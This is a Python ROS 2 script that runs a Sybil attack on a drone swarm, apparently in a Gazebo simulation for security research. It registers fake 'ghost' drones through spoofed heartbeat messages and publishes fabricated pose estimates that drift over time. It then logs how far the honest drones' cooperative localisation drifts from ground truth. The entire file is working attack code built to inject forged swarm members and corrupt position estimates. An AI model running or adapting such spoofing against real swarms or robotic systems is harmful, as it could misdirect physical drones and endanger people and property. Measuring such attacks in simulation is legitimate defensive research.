#!/usr/bin/env python3
import sys, csv, time
import numpy as np
import rclpy
from rclpy.node import Node
from std_msgs.msg import Header
from geometry_msgs.msg import PoseStamped
from swarm_msgs.msg import SwarmMember

NUM_GHOSTS    = 3
EVIL_DRONE    = "px4_2"
HONEST_DRONES = ["px4_1", "px4_3"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3"]
HEARTBEAT_HZ  = 2.0
PUBLISH_HZ    = 10.0
ATTACK_SEC    = 90.0
RAMP_SEC      = 30.0
LOG_FILE      = "/tmp/sybil_registry_attack_metrics.csv"

def ghost_config(n):
    configs = []
    for i in range(n):
        angle = 2 * np.pi * i / n
        # Spawn already spread out so all ghosts visible immediately
        spawn_pos = np.array([4.0 * np.cos(angle), 1.0 + 4.0 * np.sin(angle), 1.0])
        configs.append({
            "drone_ns": f"ghost_{i+1}",
            "spawn":    spawn_pos,
            "fake_pos": spawn_pos * 1.5,
        })
    return configs

class SybilRegistryAttack(Node):
    def __init__(self, num_ghosts, evil_ns):
        super().__init__("sybil_registry_attack")
        self.evil_ns    = evil_ns
        self.ghosts     = ghost_config(num_ghosts)
        self.start_time = time.monotonic()
        self.est        = {d: None for d in HONEST_DRONES}
        self.gt         = {d: None for d in ALL_DRONES}

        self.hb_pub   = self.create_publisher(SwarmMember, "/swarm/heartbeat", 10)
        self.est_pubs = {}
        for g in self.ghosts:
            ns = g["drone_ns"]
            self.est_pubs[ns] = self.create_publisher(PoseStamped, f"/{ns}/coop/self_estimate", 10)
            self.get_logger().warn(f"[SYBIL] Ghost: {ns} → fake_pos={g['fake_pos'].round(2)}")

        for drone in ALL_DRONES:
            self.create_subscription(PoseStamped, f"/sim/ground_truth/{drone}/pose",
                lambda msg, d=drone: self.gt.update({d: np.array([msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)
        for drone in HONEST_DRONES:
            self.create_subscription(PoseStamped, f"/{drone}/coop/self_estimate",
                lambda msg, d=drone: self.est.update({d: np.array([msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)

        self._csv_file = open(LOG_FILE, "w", newline="")
        self._csv      = csv.writer(self._csv_file)
        header = ["t_s", "num_ghosts", "phase"]
        for d in HONEST_DRONES:
            header += [f"{d}_est_x", f"{d}_est_y", f"{d}_est_z",
                       f"{d}_gt_x",  f"{d}_gt_y",  f"{d}_gt_z", f"{d}_error_m"]
        self._csv.writerow(header)

        self.create_timer(1.0 / HEARTBEAT_HZ, self._send_heartbeats)
        self.create_timer(1.0 / PUBLISH_HZ,   self._tick)
        self.get_logger().warn(f"[SYBIL] {num_ghosts} ghosts | evil={evil_ns} | log={LOG_FILE}")

    def _send_heartbeats(self):
        for g in self.ghosts:
            msg = SwarmMember()
            msg.header           = Header()
            msg.header.stamp     = self.get_clock().now().to_msg()
            msg.header.frame_id  = "world"
            msg.drone_ns        = g["drone_ns"]
            msg.spawn_x, msg.spawn_y, msg.spawn_z = float(g["spawn"][0]), float(g["spawn"][1]), float(g["spawn"][2])
            msg.drone_type       = "gz_x500"
            msg.is_armed         = True
            self.hb_pub.publish(msg)

    def _tick(self):
        elapsed = time.monotonic() - self.start_time
        if elapsed > ATTACK_SEC:
            self.get_logger().info("[SYBIL] Attack complete.")
            self._csv_file.flush(); self._csv_file.close()
            self.destroy_node(); return

        alpha = min(elapsed / RAMP_SEC, 1.0)
        phase = "warmup" if elapsed < 5.0 else "attack"

        for g in self.ghosts:
            pos = (1 - alpha) * g["spawn"] + alpha * g["fake_pos"]
            msg = PoseStamped()
            msg.header.stamp       = self.get_clock().now().to_msg()
            msg.header.frame_id    = "world"
            msg.pose.position.x    = float(pos[0])
            msg.pose.position.y    = float(pos[1])
            msg.pose.position.z    = float(pos[2])
            msg.pose.orientation.w = 1.0
            self.est_pubs[g["drone_ns"]].publish(msg)

        row = [f"{elapsed:.3f}", len(self.ghosts), phase]
        for drone in HONEST_DRONES:
            est, gt = self.est.get(drone), self.gt.get(drone)
            if est is not None and gt is not None:
                err = float(np.linalg.norm(est - gt))
                row += [f"{est[0]:.4f}", f"{est[1]:.4f}", f"{est[2]:.4f}",
                        f"{gt[0]:.4f}",  f"{gt[1]:.4f}",  f"{gt[2]:.4f}", f"{err:.4f}"]
            else:
                row += [""] * 7
        self._csv.writerow(row)

        if int(elapsed) % 10 == 0 and int(elapsed * PUBLISH_HZ) % int(PUBLISH_HZ) == 0:
            for d in HONEST_DRONES:
                est, gt = self.est.get(d), self.gt.get(d)
                if est is not None and gt is not None:
                    self.get_logger().warn(f"[SYBIL t={elapsed:.0f}s] {d} error={np.linalg.norm(est-gt):.3f}m")

def main():
    num_ghosts = int(sys.argv[1]) if len(sys.argv) > 1 else NUM_GHOSTS
    evil_ns    = sys.argv[2]      if len(sys.argv) > 2 else EVIL_DRONE
    rclpy.init()
    node = SybilRegistryAttack(num_ghosts, evil_ns)
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        rclpy.shutdown()

if __name__ == "__main__":
    main()
